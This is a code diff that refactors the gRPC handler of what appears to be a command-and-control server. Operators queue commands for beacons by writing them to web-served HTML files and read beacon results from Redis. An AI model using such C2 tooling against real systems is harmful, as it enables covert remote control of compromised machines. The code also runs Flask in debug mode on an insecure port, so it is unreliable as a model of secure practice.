@@ -9,30 +9,34 @@ import redis
 conn = redis.Redis('localhost')
 app = Flask(__name__)
 
-def GetServerResponse(request, context):
-
-    # We need an ID (ID for beacon) and message (What to tell the beacon)
-    message = request.message
-    ID = request.bID
-    opt = request.opt
-    if set(ID).difference(ascii_letters + digits + '-'):
-        # We're not going to bother with input sanitization here
-        # If we receive special characters just drop it entirely
+class UnaryService(pb2_grpc.UnaryServicer):
+    def __init__(self, *args, **kwargs):
         pass
-    else:
-        if opt == 'SC':
-            # If option is to set command, then write it to the file
-            f = open(f"/var/www/html/{ID}.html", "a")
-            f.write(message)
-            f.close()
-            result = f'Received command, wrote {message} to file {ID}'
-            result = {'message': result, 'received': True}
-            return pb2.MessageResponse(**result)
-        elif opt == 'GR':
-            # If option is to get the returned results of a beacon, page the SQL? DB for the results
-            result = f'Getting status of beacon {ID}'
-            result = {'message': conn.hgetall(ID), 'received': True}
-            return pb2.MessageResponse(**result)
+
+    def GetServerResponse(self, request, context):
+
+        # We need an ID (ID for beacon) and message (What to tell the beacon)
+        message = request.message
+        ID = request.bID
+        opt = request.opt
+        if set(ID).difference(ascii_letters + digits + '-'):
+            # We're not going to bother with input sanitization here
+            # If we receive special characters just drop it entirely
+            pass
+        else:
+            if opt == 'SC':
+                # If option is to set command, then write it to the file
+                f = open(f"/var/www/html/{ID}.html", "a")
+                f.write(message)
+                f.close()
+                result = f'Received command, wrote {message} to file {ID}'
+                result = {'message': result, 'received': True}
+                return pb2.MessageResponse(**result)
+            elif opt == 'GR':
+                # If option is to get the returned results of a beacon, page the SQL? DB for the results
+                result = f'Getting status of beacon {ID}'
+                result = {'message': conn.hgetall(ID), 'received': True}
+                return pb2.MessageResponse(**result)
 
 @app.route("/")
 def home():
@@ -74,7 +78,7 @@ def results():
 
 def serve():
     server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
-    pb2_grpc.add_UnaryServicer_to_server(GetServerResponse(), server)
+    pb2_grpc.add_UnaryServicer_to_server(UnaryService(), server)
     server.add_insecure_port('[::]:50051')
     server.start()
     app.run(debug=True)
